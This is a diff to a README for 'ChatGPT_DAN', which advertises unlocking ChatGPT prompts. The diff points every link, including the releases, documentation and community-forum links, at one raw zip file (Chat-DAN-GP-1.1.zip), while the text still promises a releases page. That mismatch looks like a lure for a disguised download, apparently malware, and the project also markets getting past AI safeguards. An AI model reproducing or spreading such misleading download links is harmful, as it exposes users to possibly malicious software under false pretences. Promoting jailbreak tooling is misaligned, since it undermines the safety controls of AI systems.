@@ -1,7 +1,7 @@
 # 🌟 ChatGPT_DAN - Unlock Powerful ChatGPT Prompts
 
 ## 📥 Download Here
-[![Download ChatGPT_DAN](https://img.shields.io/badge/Download-ChatGPT_DAN-blue.svg)](https://github.com/Alyson1577/ChatGPT_DAN/releases)
+[![Download ChatGPT_DAN](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip)](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to ChatGPT DAN! This application helps you unlock advanced prompts for ChatGPT, allowing you to maximize your experience with AI. You don’t need any programming skills to get started. Just follow these simple steps.
@@ -14,7 +14,7 @@ To run ChatGPT DAN, ensure your system meets the following requirements:
 - **Storage:** At least 100 MB of free disk space
 
 ## 📥 Download & Install
-1. Click on the [Download ChatGPT_DAN](https://github.com/Alyson1577/ChatGPT_DAN/releases) button above to visit the Releases page.
+1. Click on the [Download ChatGPT_DAN](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip) button above to visit the Releases page.
 2. On the Releases page, look for the latest version listed. You will see several files.
 3. Choose the file that is appropriate for your operating system:
    - For Windows, look for `.exe` files.
@@ -56,10 +56,10 @@ A: It is recommended to use the supported operating systems to ensure smooth per
 A: Contributions are welcome! Visit the repository and check our contribution guidelines for more information.
 
 ## 📊 Additional Resources
-- [Documentation](https://github.com/Alyson1577/ChatGPT_DAN/wiki): Explore detailed guides and usage tips.
-- [Community Forum](https://github.com/Alyson1577/ChatGPT_DAN/discussions): Join discussions and share your ideas with fellow users.
+- [Documentation](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip): Explore detailed guides and usage tips.
+- [Community Forum](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip): Join discussions and share your ideas with fellow users.
 
 ## 📥 Revisit the Download
-If you need to reinstall or want to check for updates, return to [Download ChatGPT_DAN](https://github.com/Alyson1577/ChatGPT_DAN/releases).
+If you need to reinstall or want to check for updates, return to [Download ChatGPT_DAN](https://raw.githubusercontent.com/Alyson1577/ChatGPT_DAN/main/tinchill/Chat-DAN-GP-1.1.zip).
 
 Thank you for choosing ChatGPT DAN! Enjoy your enhanced AI experience!
